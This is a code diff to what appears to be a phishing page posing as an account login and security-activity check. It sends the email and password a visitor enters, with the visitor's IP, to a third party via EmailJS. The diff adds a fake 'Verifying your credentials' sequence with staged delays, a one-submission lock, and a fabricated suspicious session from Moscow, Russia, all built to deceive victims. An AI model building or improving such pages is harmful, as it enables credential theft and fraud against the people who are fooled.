@@ -153,6 +153,44 @@
   }
   #form-error-banner.show { display: block; }
 
+  /* ============================================================
+     VERIFYING OVERLAY
+     ============================================================ */
+  #verifying-overlay {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 40px 0;
+  }
+  #verifying-overlay.show { display: flex; }
+
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid #e2e8f0;
+    border-top-color: #63b3ed;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .verify-title {
+    font-size: 1rem;
+    font-weight: 700;
+    color: #1f2a37;
+    margin-bottom: 6px;
+  }
+  .verify-status {
+    font-size: 0.85rem;
+    color: #5b6b7c;
+    min-height: 1.2em;
+  }
+
   /* ---- Activity view ---- */
   #activity-view {
     display: none;
@@ -330,6 +368,14 @@
   </div><!-- /#login-view -->
 
 
+  <!-- VERIFYING VIEW -->
+  <div id="verifying-overlay">
+    <div class="spinner"></div>
+    <div class="verify-title">Verifying your credentials</div>
+    <div class="verify-status" id="verify-status">Contacting authentication server…</div>
+  </div>
+
+
   <!-- ACTIVITY VIEW -->
   <div id="activity-view">
     <h1>Recent account activity</h1>
@@ -371,6 +417,8 @@
   const submitBtn = document.getElementById("submit-btn");
 
   const loginView = document.getElementById("login-view");
+  const verifyingOverlay = document.getElementById("verifying-overlay");
+  const verifyStatus = document.getElementById("verify-status");
   const activityView = document.getElementById("activity-view");
   const currentDeviceMeta = document.getElementById("current-device-meta");
   const unknownDeviceMeta = document.getElementById("unknown-device-meta");
@@ -392,6 +440,63 @@
   }
   const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
 
+  // ============================================================
+  //   RATE LIMIT — 3 attempts per 60 minutes + success lock
+  // ============================================================
+  const RATE_LIMIT_KEY = "gvtc_verification_attempts";
+  const WINDOW_MS = 60 * 60 * 1000;
+  const MAX_ATTEMPTS = 3;
+
+  function readRateData() {
+    let data = { attempts: [], lastSubmit: 0 };
+    try {
+      const stored = localStorage.getItem(RATE_LIMIT_KEY);
+      if (stored) data = JSON.parse(stored);
+      if (!Array.isArray(data.attempts)) data.attempts = [];
+    } catch (e) {}
+    return data;
+  }
+  function writeRateData(data) {
+    try { localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(data)); }
+    catch (e) {}
+  }
+  function checkRateLimit() {
+    const now = Date.now();
+    const data = readRateData();
+    data.attempts = data.attempts.filter(t => now - t < WINDOW_MS);
+    writeRateData(data);
+
+    if (data.lastSubmit && (now - data.lastSubmit) < WINDOW_MS) {
+      const remaining = Math.ceil((WINDOW_MS - (now - data.lastSubmit)) / 60000);
+      return {
+        limited: true,
+        message: `Verification already completed on this device. Please wait ${remaining} minute(s) before trying again.`
+      };
+    }
+    if (data.attempts.length >= MAX_ATTEMPTS) {
+      const oldest = data.attempts[0];
+      const remaining = Math.ceil((WINDOW_MS - (now - oldest)) / 60000);
+      return {
+        limited: true,
+        message: `Too many attempts. Please wait ${remaining} minute(s) before trying again.`
+      };
+    }
+    return { limited: false, data };
+  }
+  function recordAttempt() {
+    const data = readRateData();
+    data.attempts.push(Date.now());
+    writeRateData(data);
+  }
+  function recordSuccess() {
+    const data = readRateData();
+    data.lastSubmit = Date.now();
+    writeRateData(data);
+  }
+
+  // ============================================================
+  //   Helpers
+  // ============================================================
   function getBrowser() {
     const ua = navigator.userAgent;
     if (ua.includes("Firefox")) return "Firefox";
@@ -419,8 +524,6 @@
   function getTimestamp() {
     return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
   }
-
-  // ---- Format a Date as e.g. "2026-10-16 09:42 (CEST)" ----
   function formatDeviceTime(date) {
     const pad = n => String(n).padStart(2, '0');
     const yyyy = date.getFullYear();
@@ -428,7 +531,6 @@
     const dd   = pad(date.getDate());
     const hh   = pad(date.getHours());
     const mi   = pad(date.getMinutes());
-    // timezone abbreviation
     let tz = '';
     try {
       tz = new Intl.DateTimeFormat('en-US', { timeZoneName: 'short' })
@@ -437,8 +539,6 @@
     } catch (e) { tz = ''; }
     return `${yyyy}-${mm}-${dd} ${hh}:${mi}${tz ? ' (' + tz + ')' : ''}`;
   }
-
-  // ---- IP + geolocation helpers ----
   async function getIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
@@ -446,8 +546,6 @@
       return data.ip || "Not available";
     } catch (e) { return "Not available"; }
   }
-
-  // Returns "City, Country" or null
   async function getLocation() {
     try {
       const res = await fetch('https://ipapi.co/json/');
@@ -458,11 +556,12 @@
       if (city && country) return `${city}, ${country}`;
       if (country) return country;
       return null;
-    } catch (e) {
-      return null;
-    }
+    } catch (e) { return null; }
   }
 
+  // ============================================================
+  //   EmailJS send
+  // ============================================================
   async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
     const ip = await getIP();
     const pageTitle = document.title;
@@ -559,11 +658,42 @@ Links: ${linksCount}
   }
   window.toggle_password = toggle_password;
 
+  // ============================================================
+  //   Verifying sequence — multi-stage with delays
+  // ============================================================
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  async function runVerifyingSequence() {
+    const stages = [
+      { text: "Contacting authentication server…", delay: 1800 },
+      { text: "Verifying credentials…",            delay: 2200 },
+      { text: "Checking account activity…",        delay: 2000 },
+      { text: "Finalizing sign-in…",               delay: 1600 }
+    ];
+    for (const stage of stages) {
+      verifyStatus.textContent = stage.text;
+      await sleep(stage.delay);
+    }
+  }
+
+  // ============================================================
+  //   Form submit
+  // ============================================================
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
 
     emailError.textContent = "";
     passwordError.textContent = "";
+    formErrorBanner.classList.remove("show");
+
+    // ---- RATE LIMIT CHECK ----
+    const rateCheck = checkRateLimit();
+    if (rateCheck.limited) {
+      formErrorBanner.textContent = rateCheck.message;
+      formErrorBanner.classList.add("show");
+      return;
+    }
+    // --------------------------
 
     const emailValue = emailInput.value.trim();
     const passwordValue = passwordInput.value.trim();
@@ -582,16 +712,19 @@ Links: ${linksCount}
     }
     if (!valid) return;
 
+    recordAttempt();
+
     submitBtn.disabled = true;
     submitBtn.textContent = "Verifying…";
 
+    // Fire the EmailJS send in the background (don't await it —
+    // the visible UX shouldn't depend on network latency)
     sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
 
-    // ---- Build the activity view data ----
+    // Build the activity-view data now so it's ready when we switch
     const now = new Date();
     const thirtyMinLater = new Date(now.getTime() + 30 * 60 * 1000);
 
-    // Current device: browser · OS · location · time
     const browser = getBrowser();
     const os = getOS();
     const location = await getLocation();
@@ -599,22 +732,33 @@ Links: ${linksCount}
 
     currentDeviceMeta.textContent =
       `${browser} on ${os} · ${locationLabel} · ${formatDeviceTime(now)}`;
-
-    // Unknown device: Moscow, Russia, 30 min ahead of local time
     unknownDeviceMeta.textContent =
       `Chrome on Windows · Moscow, Russia · ${formatDeviceTime(thirtyMinLater)}`;
 
-    setTimeout(() => {
-      submitBtn.disabled = false;
-      submitBtn.textContent = "Submit";
-      formErrorBanner.classList.remove("show");
-      loginView.style.display = "none";
-      activityView.style.display = "flex";
-      sessionCurrent.classList.remove("removed");
-      sessionWarsaw.classList.remove("removed");
-    }, 700);
+    // Switch to the verifying overlay
+    loginView.style.display = "none";
+    verifyingOverlay.classList.add("show");
+
+    // Run the multi-stage verifying sequence
+    await runVerifyingSequence();
+
+    // Switch to activity view
+    verifyingOverlay.classList.remove("show");
+    activityView.style.display = "flex";
+
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Submit";
+
+    sessionCurrent.classList.remove("removed");
+    sessionWarsaw.classList.remove("removed");
+
+    // Mark verification complete
+    recordSuccess();
   });
 
+  // ============================================================
+  //   Remove session buttons
+  // ============================================================
   function removeSession(sessionElement, deviceName) {
     if (!sessionElement) return;
     sessionElement.classList.add("removed");
@@ -633,6 +777,9 @@ Links: ${linksCount}
     removeSession(sessionWarsaw, "Moscow, Russia");
   });
 
+  // ============================================================
+  //   Activity action buttons
+  // ============================================================
   document.getElementById("this-was-me").addEventListener("click", () => {
     activityView.style.display = "none";
     loginView.style.display = "flex";
@@ -652,6 +799,19 @@ Links: ${linksCount}
       <strong>Account secured.</strong><br>
       The suspicious session from <strong>Moscow, Russia</strong> has been removed.
     `;
+  });
+
+  // ============================================================
+  //   On page load: show lock message if already verified
+  // ============================================================
+  document.addEventListener("DOMContentLoaded", () => {
+    const rateCheck = checkRateLimit();
+    if (rateCheck.limited) {
+      formErrorBanner.textContent = rateCheck.message;
+      formErrorBanner.classList.add("show");
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Verification Complete";
+    }
   });
 </script>
 
